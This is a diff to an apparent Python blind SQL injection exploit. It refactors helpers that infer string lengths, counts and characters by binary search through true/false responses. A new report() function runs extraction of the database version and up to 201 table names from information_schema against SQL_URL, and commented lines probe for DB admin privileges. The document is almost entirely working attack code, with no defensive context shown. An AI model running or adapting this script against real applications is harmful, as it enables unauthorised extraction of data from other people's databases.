@@ -35,20 +35,15 @@ def response_truth_condition(response):
         return True
     return False
 
-def question(ip, sub_query, debug=False):
-    if(blind_query(ip, sub_query, response_truth_condition, encode=True, debug=debug)):
-        print(F"(+) Result of expression [{sub_query}] is true")
-        return True
-    else:
-        print(F"(+) Result of expression [{sub_query}] is false")
-        return False
-def getLength(ip, sub_query, lower_bound, upper_bound):
+def question(ip, sub_query, encode=False, debug=False):
+    return blind_query(ip, sub_query, response_truth_condition, encode=encode, debug=debug)
+def getLength(ip, sub_query, lower_bound, upper_bound, encode=False):
    for i in range(lower_bound, upper_bound):
-        if(question(ip, QUERIES['LENGTH_EXFIL'](sub_query, i), debug=False)):
+        if(question(ip, QUERIES['LENGTH_EXFIL'](sub_query, i), encode=encode, debug=False)):
             return i
-def getCount(ip, sub_query, lower_bound, upper_bound):
+def getCount(ip, sub_query, lower_bound, upper_bound, encode=False):
    for i in range(lower_bound, upper_bound):
-        if(question(ip, QUERIES['COUNT_EXFIL'](sub_query, i), debug=False)):
+        if(question(ip, QUERIES['COUNT_EXFIL'](sub_query, i), encode=encode, debug=False)):
             return i
 def binary_search(lo, hi, condition):
     while lo <= hi:
@@ -58,10 +53,10 @@ def binary_search(lo, hi, condition):
         else:
             hi = mid - 1
     return lo
-def getString(ip, sub_query, string_length, verbose=False):
+def getString(ip, sub_query, string_length, encode=False,verbose=False):
     s = ''
-    for position in range(1,string_length):
-        condition = lambda mid: blind_query(ip, QUERIES['STRING_EXFIL'](sub_query,position,mid), response_truth_condition, encode=True, debug=False)
+    for position in range(1, string_length+1):
+        condition = lambda mid: blind_query(ip, QUERIES['STRING_EXFIL'](sub_query,position,mid), response_truth_condition, encode=encode, debug=False)
         s+=chr(binary_search(32, 126, condition))
         if(verbose == True):
             sys.stdout.write(s[position - 1])
@@ -70,35 +65,43 @@ def getString(ip, sub_query, string_length, verbose=False):
 '''
 EXAMPLES
 '''
+def report():
 
-#############################################################
-# GET THE LENGTH OF A STRING
-# (USEFUL IS REDUCING THE NUMBER OF REQUESTS) 
-#############################################################
-#print(getLength(SQL_URL, "select version()", 1,20))
-#############################################################
-# GET THE DB VERSION
-#############################################################
-#print(getString(SQL_URL, "select version()", 20))
-#getString(SQL_URL, "select version()", 20, verbose=True)
-#############################################################
-# CHECK IF THE CURRENT DB USER HAS ADMIN PRIVILEDGES
-#############################################################
-#blind_query(SQL_URL, queries['CURRENT_USER_IS_DB_ADMIN']('root@localhosts'), response_truth_condition, True, True)
-#question(SQL_URL, QUERIES['CURRENT_USER_IS_DB_ADMIN']('root@localhost'))
-#############################################################
-# GET NUMBER OF TABLES IN THE CURRENT DB
-#############################################################
-#print(getCount(SQL_URL, "SELECT COUNT(table_name) FROM information_schema.tables", 0, 250))
-#############################################################
-# EXFIL ALL TABLE NAMES IN DB
-#############################################################
-#tables = []
-#for i in range(0, 2):
-#    tables.append(getString(SQL_URL, F"SELECT table_name FROM information_schema.tables LIMIT {i},1", 64, verbose=False))
-#print(tables)
-def main():
-    pass
+    #############################################################
+    # GET THE LENGTH OF A STRING
+    # (USEFUL IS REDUCING THE NUMBER OF REQUESTS) 
+    #############################################################
+    db_version_strlen = getLength(SQL_URL, "select version()", 1,20, encode=True)
+    #############################################################
+    # GET THE DB VERSION
+    #############################################################
+    #print('(+) DB Version:',getString(SQL_URL, "select version()", db_version_strlen, encode=True))
+    #getString(SQL_URL, "select version()", 20, verbose=True)
+    #############################################################
+    # CHECK IF THE CURRENT DB USER HAS ADMIN PRIVILEDGES
+    #############################################################
+    #blind_query(SQL_URL, queries['CURRENT_USER_IS_DB_ADMIN']('root@localhosts'), response_truth_condition, True, True)
+    #print(F"(+) Current User is DB Admin?: ", question(SQL_URL, QUERIES['CURRENT_USER_IS_DB_ADMIN']('root@localhost'), encode=True))
+    #############################################################
+    # GET NUMBER OF TABLES IN THE CURRENT DB
+    #############################################################
+    #num_tables = getCount(SQL_URL, "SELECT COUNT(table_name) FROM information_schema.tables", 0, 250, encode=True)
+    #print('(+) Table Count: ', num_tables)
+    #############################################################
+    # EXFIL ALL TABLE NAMES IN DB
+    #############################################################
+    table_name_lengths = []
+    tables = []
+    #for i in range (0, num_tables):
+    for i in range (0, 201):
+        table_name_lengths.append(getLength(SQL_URL, F"SELECT table_name FROM information_schema.tables LIMIT {i},1", 1,40, encode=True))
+        #print(i, ":", table_name_lengths[i])
+        tables.append(getString(SQL_URL, F"SELECT table_name FROM information_schema.tables LIMIT {i},1", table_name_lengths[i], encode=True))
+        print(tables[i], ":", table_name_lengths[i])
+    #print(table_name_lengths)
+    #
+    #for i in range(0, 2):
+    #    tables.append(getString(SQL_URL, F"SELECT table_name FROM information_schema.tables LIMIT {i},1", 64, verbose=False))
+    #print(tables)
 
-if __name__ == "__main__":
-    main()
+report()
